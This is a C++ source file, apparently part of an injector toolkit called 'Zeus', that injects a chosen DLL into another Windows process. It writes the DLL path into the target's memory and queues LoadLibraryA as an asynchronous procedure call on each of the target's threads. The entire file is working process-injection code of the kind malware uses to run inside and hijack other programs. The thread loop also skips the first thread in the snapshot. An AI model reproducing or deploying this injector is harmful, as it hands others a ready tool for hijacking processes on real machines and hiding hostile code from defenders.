/* 
* ZeusQueueUserAPC.cpp : Holds the mechanism
* required for dll injection using QueueUserAPC
* Method.
*
* Written By : @Ice3man
* Email : EthanTom543@gmail.com
*
* (C) Ice3man
*/

#include "Zeus.h"
#include <TlHelp32.h>


/* 
* ZeusQueueUserAPC: Injects A Dll using
* QueueUserAPC API. One of the best techniques
*
*
* @Arguments : 
*	@ProcID : Process ID to inject
*	@szDllLoc : Location of the Dll TO Inject
*
* @Return :
*	@Void
*/
int ZeusQueueUserAPC(int ProcID, char *szDllLoc)
{
	DWORD ThreadID = 0, Result = 0;

	HANDLE hProcess = ZeusOpenProcess(ProcID);
	LPVOID arg = ZeusWriteDllStrMemory(szDllLoc, hProcess);

	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (addr == NULL)
	{
#ifdef _DEBUG_
		printf("\n[!] Error : Could not get Library Address !");
#endif
		ExitProcess(1);
	}
	printf("\n[+] Got Address Of LoadLibraryA Successfully !");

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("\n[!] Error : Could Not Get Thread Information !");
		ExitProcess(1);
	}

	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	DWORD bResult = Thread32First(hSnapshot, &threadEntry);
	while (bResult)
	{
		bResult = Thread32Next(hSnapshot, &threadEntry);
		if (bResult)
		{
			if (threadEntry.th32OwnerProcessID == ProcID)
			{
					ThreadID = threadEntry.th32ThreadID;

					/*
					* Threads may not trigger APC Immediately, So Keep trying and 
					* also try all threads. Maybe one of them bite the dust
					*/

					printf("\n[+] Using thread: %i\n", ThreadID);
					HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, ThreadID);
					if (hThread == NULL)
					{
						printf("\n[!] Error : Could Not Open Thread ! Trying other ...");
					}
					else
					{
						// Queue the APC
						DWORD dwResult = QueueUserAPC((PAPCFUNC)addr, hThread, (ULONG_PTR) arg);
						if (!dwResult)
						{
							printf("\n[!] Error : Could Not Queue User APC ! Trying other Threads...");
						}
						else 
						{
							printf("\n[+] Successfully Queued User APC !");
						}
						CloseHandle(hThread);
					}
			
			}
		}
	}
	ExitProcess(0);
}
